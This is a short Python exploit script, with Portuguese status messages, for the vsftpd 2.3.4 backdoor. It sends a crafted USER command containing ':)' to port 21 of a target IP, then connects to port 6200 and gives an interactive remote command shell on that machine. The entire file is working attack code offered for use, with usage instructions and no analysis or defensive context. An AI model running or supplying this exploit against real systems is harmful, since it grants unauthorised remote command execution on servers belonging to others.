import os
import time
import sys
from colorama import Fore, Style
import socket
import subprocess

print(f"{Fore.GREEN}[*] EXPLOIT VSFTPD 2.3.4 - By unoxy5 [*]{Style.RESET_ALL}\n")
if len(sys.argv) < 2:
    sys.exit("Usage: python ftpxploit.py 192.168.x.x")

ip_address = sys.argv[1]

try:
    print(f"{Fore.GREEN}[+] Carregando exploit...{Style.RESET_ALL}")
    time.sleep(2)
    print(f"{Fore.GREEN}[+] Iniciando socket...{Style.RESET_ALL}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip_address, 21))
except socket.error as e:
    print(f"{Fore.RED}[!] Não foi possível se conectar! Erro: {e}{Style.RESET_ALL}")
    sys.exit(1)

try:
    print(f"{Fore.GREEN}[+] Socket iniciado...{Style.RESET_ALL}")
    time.sleep(1)
    print(f"{Fore.GREEN}[+] Enviando comandos USER e PASS...{Style.RESET_ALL}")
    sock.sendall(b'USER anything:)\n')
    sock.sendall(b'PASS anything\n')
    time.sleep(2)
    print(f"{Fore.GREEN}[+] Conectando ao backdoor...{Style.RESET_ALL}")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as backdoor_sock:
        backdoor_sock.connect((ip_address, 6200))
        print(f"{Fore.GREEN}[+] Conexão com o backdoor estabelecida.{Style.RESET_ALL}")
        
        while True:
            command = input("whoami> ")
            
            if command.lower() in ['exit', 'quit']:
                break

            backdoor_sock.sendall(command.encode() + b'\n')
            response = backdoor_sock.recv(4096).decode()
            print(response)
except Exception as e:
    print(f"{Fore.RED}[!] Erro durante a execução: {e}{Style.RESET_ALL}")
finally:
    sock.close()
